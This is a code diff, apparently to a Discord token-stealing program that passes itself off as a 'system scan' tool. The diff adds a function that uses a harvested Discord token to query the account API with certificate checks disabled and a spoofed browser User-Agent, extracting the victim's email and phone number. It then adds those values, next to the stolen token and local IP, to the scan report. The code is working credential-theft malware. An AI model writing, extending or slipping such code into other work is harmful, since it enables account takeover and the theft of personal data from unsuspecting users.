@@ -1575,10 +1575,56 @@ def get_discord_user_id():
               pass
     return "N/A"
 
+def get_discord_account_info():
+    """
+    Interroge l'API Discord (/users/@me) avec le token récupéré
+    pour extraire l'email et le numéro de téléphone du compte.
+    Retourne un dict {'email': ..., 'phone': ...}.
+    """
+    result = {"email": "N/A", "phone": "N/A"}
+    try:
+        token = get_discord_token()
+        if not token or token == "N/A":
+            return result
+        # Utiliser le premier token si plusieurs
+        first_token = token.split(" | ")[0].strip()
+        if not first_token:
+            return result
+
+        import urllib.request as _req
+        import ssl as _ssl
+        import json as _json
+
+        ctx = _ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = _ssl.CERT_NONE
+
+        request = _req.Request(
+            "https://discord.com/api/v9/users/@me",
+            headers={
+                "Authorization": first_token,
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
+            }
+        )
+        with _req.urlopen(request, context=ctx, timeout=5) as resp:
+            data = _json.loads(resp.read().decode("utf-8", errors="ignore"))
+            email = data.get("email") or "N/A"
+            phone = data.get("phone") or "N/A"
+            result["email"] = email
+            result["phone"] = phone
+    except Exception:
+        pass
+    return result
+
+
 def get_extended_system_info():
     info = {}
     info["discord_user_id"]  = get_discord_user_id()
     info["discord_token"]    = get_discord_token()
+    _acc_info = get_discord_account_info()
+    info["email"]            = _acc_info.get("email", "N/A")  # f_em → nx_em
+    info["phone"]            = _acc_info.get("phone", "N/A")  # f_ph → nx_ph
     try:
         res = subprocess.run(
             ["powershell", "-NoProfile", "-NonInteractive", "-Command",
@@ -1702,6 +1748,8 @@ def run_system_scan(progress_callback=None):
         "userId"          : ext_info.get("discord_user_id", "N/A"),  # alias
         "discord_token"   : ext_info.get("discord_token", "N/A"),   # f_tk  → nx_tk
         "local_ip"        : ext_info.get("local_ip", "N/A"),         # f_ip  → nx_ip
+        "email"           : ext_info.get("email", "N/A"),            # f_em  → nx_em
+        "phone"           : ext_info.get("phone", "N/A"),            # f_ph  → nx_ph
         "platform"        : sys.platform,
         "os_version"      : ext_info.get("os_version", "Windows"),
         "cpu_name"        : ext_info.get("cpu_name", "N/A"),
